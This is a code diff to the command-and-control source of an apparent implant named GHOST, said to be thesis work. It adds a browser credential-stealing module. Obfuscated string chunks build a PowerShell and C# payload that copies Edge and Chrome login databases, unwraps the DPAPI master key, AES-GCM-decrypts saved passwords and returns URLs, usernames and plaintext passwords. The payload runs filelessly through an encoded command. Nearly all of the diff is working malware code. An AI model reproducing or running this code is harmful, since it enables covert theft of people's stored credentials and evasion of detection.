@@ -683,38 +683,49 @@ static std::wstring HandleReverse(const std::string& args) {
 }
 
 // =====================================================================
-//  BROWSER CREDENTIALS — script built from XSW parts, no static b64 blob
+//  BROWSER CREDENTIAL RECOVERY — Edge / Chrome  [MITRE T1555.003]
 // =====================================================================
+// Script below is generated from tests/browser_dump.ps1 (single source of
+// truth — regenerate these chunks after editing it). Stock-Windows pipeline:
+// winsqlite3.dll (System32) reads the copied Login Data; the os_crypt master
+// key from Local State is DPAPI-unprotected and used for AES-256-GCM on
+// v10/v11 blobs (bcrypt.dll); pre-v80 rows fall back to plain DPAPI.
+// Chrome >= 127 "v20" app-bound entries are detected and reported, not
+// decrypted — documented limitation for the thesis.
 static std::wstring HandleBrowser(const std::string& /*args*/) {
-    // Query Edge Login Data via SQLite-backed Csharp provider
-    auto p1 = XSW(L"$r=@\n\"select username_value, password_value from logins\"@\n;");
-    auto p2 = XSW(L"$path=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\";");
-    auto p3 = XSW(L"$creds='';");
-    auto p4 = XSW(L"if(Test-Path $path){");
-    auto p5 = XSW(L"$tmp=[System.IO.Path]::GetTempFileName();");
-    auto p6 = XSW(L"Copy-Item $path $tmp -Force;");
-    auto p7 = XSW(L"Add-Type -AssemblyName System.Data;");
-    auto p8 = XSW(L"$cn=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tmp;Version=3;\");");
-    auto p9 = XSW(L"try{$cn.Open();$cmd=$cn.CreateCommand();");
-    auto pa = XSW(L"$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';");
-    auto pb = XSW(L"$rd=$cmd.ExecuteReader();");
-    auto pc = XSW(L"while($rd.Read()){$url=$rd[0];$user=$rd[1];");
-    auto pd = XSW(L"$enc=[byte[]]$rd[2];");
-    auto pe = XSW(L"$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);");
-    auto pf = XSW(L"$pw=[System.Text.Encoding]::UTF8.GetString($dec);");
-    auto pg = XSW(L"$creds+=\"$url | $user | $pw`n\"}}catch{}finally{$cn.Close();Remove-Item $tmp -Force}};$creds");
-
-    std::wstring wScript = std::wstring(p1.str()) + p2.str() + p3.str() + p4.str()
-                         + p5.str() + p6.str() + p7.str() + p8.str() + p9.str()
-                         + pa.str() + pb.str() + pc.str() + pd.str() + pe.str()
-                         + pf.str() + pg.str();
+    auto s1 = XSW(L"# GHOST - browser credential recovery (Edge / Chrome)  [MITRE T1555.003]\n#\n# This file is the single source of truth for the script the implant embeds:\n# the LIBRARY section (everything above the DRIVER marker) is compiled into\n# src/c2.cpp as XSW string chunks and shipped via -EncodedCommand. Keep both\n# in sync - the C++ chunks are generated from this file.\n#\n# Stock-Windows design (no third-party dependencies):\n");
+    auto s2 = XSW(L"#   - SQLite access   : winsqlite3.dll (ships in System32, Win10/11)\n#   - AES-256-GCM     : bcrypt.dll CNG (Chrome >= v80 \"v10\" scheme)\n#   - Master key      : os_crypt.encrypted_key in \"Local State\", DPAPI CurrentUser\n#   - Legacy pre-v80  : plain DPAPI on password_value\n# Limitation (documented for the thesis): Chrome >= 127 app-bound encryption\n# (\"v20\" blobs) is detected and reported as not recoverable; Edge is unaffected.\n\n");
+    auto s3 = XSW(L"Add-Type -AssemblyName System.Security | Out-Null\n\n$GHOST_CS = '\nusing System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\nusing System.Text;\n\npublic static class GhostSql {\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_open_v2(byte[] filename, out IntPtr db, int flags, IntPtr vfs);\n");
+    auto s4 = XSW(L"    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_prepare_v2(IntPtr db, byte[] query, int nByte, out IntPtr stmt, IntPtr tail);\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_step(IntPtr stmt);\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n");
+    auto s5 = XSW(L"    private static extern IntPtr sqlite3_column_text(IntPtr stmt, int col);\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int col);\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_column_bytes(IntPtr stmt, int col);\n");
+    auto s6 = XSW(L"    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_finalize(IntPtr stmt);\n    [DllImport(\"winsqlite3.dll\", CallingConvention = CallingConvention.Cdecl)]\n    private static extern int sqlite3_close(IntPtr db);\n\n    private static string ColumnText(IntPtr stmt, int col) {\n        IntPtr p = sqlite3_column_text(stmt, col);\n        if (p == IntPtr.Zero) { return string.Empty; }\n");
+    auto s7 = XSW(L"        int n = sqlite3_column_bytes(stmt, col);\n        byte[] b = new byte[n];\n        Marshal.Copy(p, b, 0, n);\n        return Encoding.UTF8.GetString(b);\n    }\n\n    // Runs one statement; rows come back as col0 + \\u0001 + col1 + \\u0001 + col2-blob-base64\n    public static string[] Query(string dbPath, string sql, int openFlags = 1) {\n        var rows = new List<string>();\n        byte[] pathB = Encoding.UTF8.GetBytes(dbPath + \"\\0\");\n");
+    auto s8 = XSW(L"        byte[] sqlB = Encoding.UTF8.GetBytes(sql + \"\\0\");\n        IntPtr db, stmt;\n        if (sqlite3_open_v2(pathB, out db, openFlags, IntPtr.Zero) != 0) {\n            sqlite3_close(db);\n            return rows.ToArray();\n        }\n        if (sqlite3_prepare_v2(db, sqlB, sqlB.Length, out stmt, IntPtr.Zero) == 0) {\n            while (sqlite3_step(stmt) == 100) {\n                string c2 = string.Empty;\n");
+    auto s9 = XSW(L"                IntPtr bp = sqlite3_column_blob(stmt, 2);\n                int bn = sqlite3_column_bytes(stmt, 2);\n                if (bp != IntPtr.Zero && bn > 0) {\n                    byte[] bb = new byte[bn];\n                    Marshal.Copy(bp, bb, 0, bn);\n                    c2 = Convert.ToBase64String(bb);\n                }\n                rows.Add(ColumnText(stmt, 0) + \"\\u0001\" + ColumnText(stmt, 1) + \"\\u0001\" + c2);\n            }\n");
+    auto s10 = XSW(L"            sqlite3_finalize(stmt);\n        }\n        sqlite3_close(db);\n        return rows.ToArray();\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    private struct AuthInfo {\n        public int cbSize;\n        public int dwInfoVersion;\n        public IntPtr pbNonce; public int cbNonce;\n        public IntPtr pbAuthData; public int cbAuthData;\n        public IntPtr pbTag; public int cbTag;\n");
+    auto s11 = XSW(L"        public IntPtr pbMacContext; public int cbMacContext;\n        public int cbAAD;\n        public ulong cbData;\n        public int dwFlags;\n    }\n\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, string pszAlgId, string pszImplementation, int dwFlags);\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n");
+    auto s12 = XSW(L"    private static extern int BCryptSetProperty(IntPtr hObject, string pszProp, byte[] pbInput, int cbInput, int dwFlags);\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n");
+    auto s13 = XSW(L"    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref AuthInfo pInfo, IntPtr pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n    private static extern int BCryptDestroyKey(IntPtr hKey);\n    [DllImport(\"bcrypt.dll\", CharSet = CharSet.Unicode)]\n");
+    auto s14 = XSW(L"    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, int dwFlags);\n\n    // Chrome v10/v11 blob: magic[3] || nonce[12] || ciphertext || tag[16]\n    public static string DecryptGcm(byte[] key, byte[] blob) {\n        if (key == null || key.Length != 32 || blob == null || blob.Length < 31) { return null; }\n        byte[] nonce = new byte[12];\n        Array.Copy(blob, 3, nonce, 0, 12);\n        int ctLen = blob.Length - 15 - 16;\n");
+    auto s15 = XSW(L"        byte[] ct = new byte[ctLen];\n        byte[] tag = new byte[16];\n        Array.Copy(blob, 15, ct, 0, ctLen);\n        Array.Copy(blob, 15 + ctLen, tag, 0, 16);\n\n        IntPtr hAlg, hKey = IntPtr.Zero;\n        if (BCryptOpenAlgorithmProvider(out hAlg, \"AES\", null, 0) != 0) { return null; }\n        int st = 1;\n        byte[] gcmName = Encoding.Unicode.GetBytes(\"ChainingModeGCM\\0\");\n");
+    auto s16 = XSW(L"        if (BCryptSetProperty(hAlg, \"ChainingMode\", gcmName, gcmName.Length, 0) == 0) {\n            st = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);\n        }\n        if (st != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return null; }\n\n        AuthInfo info = new AuthInfo();\n        info.cbSize = Marshal.SizeOf(typeof(AuthInfo));\n        info.dwInfoVersion = 1;\n");
+    auto s17 = XSW(L"        info.pbNonce = Marshal.AllocHGlobal(12);\n        Marshal.Copy(nonce, 0, info.pbNonce, 12);\n        info.cbNonce = 12;\n        info.pbTag = Marshal.AllocHGlobal(16);\n        Marshal.Copy(tag, 0, info.pbTag, 16);\n        info.cbTag = 16;\n        byte[] plain = new byte[ctLen];\n        int done = 0;\n        st = BCryptDecrypt(hKey, ct, ctLen, ref info, IntPtr.Zero, 0, plain, plain.Length, out done, 0);\n");
+    auto s18 = XSW(L"        Marshal.FreeHGlobal(info.pbNonce);\n        Marshal.FreeHGlobal(info.pbTag);\n        BCryptDestroyKey(hKey);\n        BCryptCloseAlgorithmProvider(hAlg, 0);\n        if (st != 0) { return null; }\n        return Encoding.UTF8.GetString(plain, 0, done);\n    }\n}\n'\nAdd-Type -TypeDefinition $GHOST_CS\n\nfunction Get-GhostBrowserData([string]$userDataRoot) {\n    $lines = New-Object System.Collections.Generic.List[string]\n");
+    auto s19 = XSW(L"    $lsPath = Join-Path $userDataRoot 'Local State'\n    if (-not (Test-Path -LiteralPath $lsPath)) { return $lines }\n    $key = $null\n    try {\n        $json = Get-Content -LiteralPath $lsPath -Raw | ConvertFrom-Json\n        $keyB64 = $json.os_crypt.encrypted_key\n        if (-not $keyB64) { return $lines }\n        $keyBlob = [Convert]::FromBase64String($keyB64)\n        if ($keyBlob.Length -le 5) { return $lines }\n");
+    auto s20 = XSW(L"        $key = [System.Security.Cryptography.ProtectedData]::Unprotect(\n                   $keyBlob[5..($keyBlob.Length - 1)], $null,\n                   [System.Security.Cryptography.DataProtectionScope]::CurrentUser)\n    } catch { return $lines }\n    if (-not $key -or $key.Length -ne 32) { return $lines }\n\n    Get-ChildItem -LiteralPath $userDataRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {\n");
+    auto s21 = XSW(L"        $loginData = Join-Path $_.FullName 'Login Data'\n        if (-not (Test-Path -LiteralPath $loginData)) { return }\n        $tmp = [System.IO.Path]::GetTempFileName()\n        try {\n            Copy-Item -LiteralPath $loginData -Destination $tmp -Force\n            $rows = [GhostSql]::Query($tmp, 'SELECT origin_url, username_value, password_value FROM logins')\n            foreach ($row in $rows) {\n                $parts = $row.Split([char]1)\n");
+    auto s22 = XSW(L"                if ($parts.Length -lt 3 -or -not $parts[2]) { continue }\n                $url = $parts[0]\n                $user = $parts[1]\n                try { $blob = [Convert]::FromBase64String($parts[2]) } catch { continue }\n                if ($blob.Length -le 15) { continue }\n                $magic = [System.Text.Encoding]::ASCII.GetString($blob[0..2])\n                if ($magic -eq 'v20') {\n");
+    auto s23 = XSW(L"                    $lines.Add(\"$url | $user | [app-bound encrypted - not recoverable]\")\n                    continue\n                }\n                if ($magic -eq 'v10' -or $magic -eq 'v11') {\n                    $plain = [GhostSql]::DecryptGcm($key, $blob)\n                    if ($plain) { $lines.Add(\"$url | $user | $plain\") }\n                    continue\n                }\n                try {\n");
+    auto s24 = XSW(L"                    $dp = [System.Security.Cryptography.ProtectedData]::Unprotect(\n                              $blob, $null,\n                              [System.Security.Cryptography.DataProtectionScope]::CurrentUser)\n                    $lines.Add(\"$url | $user | $([System.Text.Encoding]::UTF8.GetString($dp))\")\n                } catch { }\n            }\n        } catch { }\n");
+    auto s25 = XSW(L"        finally { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }\n    }\n    return $lines\n}\n\n# === DRIVER (not embedded in implant - the implant calls the function itself) ===\n$ghostOut = New-Object System.Collections.Generic.List[string]\n$ghostOut.AddRange((Get-GhostBrowserData (Join-Path $env:LOCALAPPDATA 'Microsoft\\Edge\\User Data')))\n");
+    auto s26 = XSW(L"$ghostOut.AddRange((Get-GhostBrowserData (Join-Path $env:LOCALAPPDATA 'Google\\Chrome\\User Data')))\nif ($ghostOut.Count -eq 0) { '[no recoverable entries]' } else { $ghostOut }\n");
+    std::wstring wScript = std::wstring(s1.str() + s2.str() + s3.str() + s4.str() + s5.str() + s6.str() + s7.str() + s8.str() + s9.str() + s10.str() + s11.str() + s12.str() + s13.str() + s14.str() + s15.str() + s16.str() + s17.str() + s18.str() + s19.str() + s20.str() + s21.str() + s22.str() + s23.str() + s24.str() + s25.str() + s26.str());
 
     std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
                                    wScript.size() * sizeof(wchar_t));
     std::wstring result = RunFilelessPS(b64);
     return L"Browser data:\n" + result;
 }
-
 
 // =====================================================================
 //  STUB HANDLERS
